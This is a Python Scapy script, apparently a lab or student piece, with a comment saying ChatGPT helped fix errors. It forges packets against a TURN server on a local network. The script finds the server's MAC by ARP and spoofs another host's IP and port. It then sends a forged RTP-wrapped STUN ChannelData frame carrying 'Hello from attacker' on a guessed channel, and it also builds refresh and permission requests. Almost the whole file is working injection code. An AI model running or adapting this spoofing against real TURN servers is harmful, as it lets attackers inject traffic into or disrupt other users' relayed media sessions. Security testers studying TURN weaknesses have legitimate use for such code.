# OpenAI (2025). ChatGPT [large language model]. https://chatopenai.com (error fixing)
from scapy.all import IP, UDP, Raw, sendp, arping, Ether, get_if_list
import random
import struct
#source info
ip_src = "192.168.1.43"
#port_src = 59495
#channel_pr = 0x4001
port_src = 57989
channel_pr = 0x4000

#destenation info
ip_dst = "192.168.1.79"
port_dst = 3478

def mac_adres():
      ans, _ = arping("192.168.1.79")
      if ans:
            TURN_SERVER_MAC = ans[0][1].hwsrc
            print(f"MAC address for {"192.168.1.79"} is {TURN_SERVER_MAC}")
            return TURN_SERVER_MAC
      else:
            print(f"Could not find MAC address for {"192.168.1.79"}")
            return None
      

def fakeDataPacketWithChannel(channel_nummer):
      # RTP header fields
      version = 2         
      padding = 0         
      extension = 0       
      cc = 0              
      marker = 0          
      payload_type = 96   
      sequence_number = random.randint(0, 65535)
      print(sequence_number)
      timestamp = random.randint(0, 2**32 - 1)
      ssrc = random.randint(0, 2**32 - 1)
      b0 = (version << 6) | (padding << 5) | (extension << 4) | cc
      # Second byte: M (1 bit), PT (7 bits)
      b1 = (marker << 7) | payload_type
      
      # Pack RTP header using struct
      rtp_header = struct.pack('!BBHII', b0, b1, sequence_number, timestamp, ssrc)
      
      # STUN ChannelData fields
      channel_number = channel_nummer
      payload = b"Hello from attacker"
      length = len(payload)
      channel_header = channel_number.to_bytes(2, 'big') + length.to_bytes(2, 'big')
      stun_frame = channel_header + payload
      
      # Combine RTP + STUN ChannelData
      frame = rtp_header + stun_frame
      return frame

#generate a 
def creatPermissionRequest():
      transaction_id = random.getrandbits(96).to_bytes(12, 'big')
      message = b'\x00\x03' + b'\x00\x00' + transaction_id 
      return message


def createRefreshRequest():
      transaction_id = random.getrandbits(96).to_bytes(12, 'big')
      message = b'\x00\x04' + b'\x00\x00' + transaction_id 
      return message

def createPacket(type, mac ,channel = None):
      match type:
            case "channel":
                  if channel:
                        frame = fakeDataPacketWithChannel(channel)
                  else:
                        raise Exception("No channel adres found")
            case "refresh":
                  frame = createRefreshRequest()
            case "permission":
                  frame = creatPermissionRequest()
            case _:
                  raise Exception("type not implement or wrong")
      #create packet
      pkt = Ether(dst=mac)/\
            IP(src=ip_src, dst=ip_dst) / \
            UDP(sport=port_src, dport=port_dst) / \
            Raw(load=frame)
      return pkt

TURN_SERVER_MAC = mac_adres()
#28:d0:ea:f1:27:cd
#print(TURN_SERVER_MAC)
if TURN_SERVER_MAC == None:
      raise Exception("No mac found")
sendp(createPacket("channel", TURN_SERVER_MAC, channel=channel_pr))
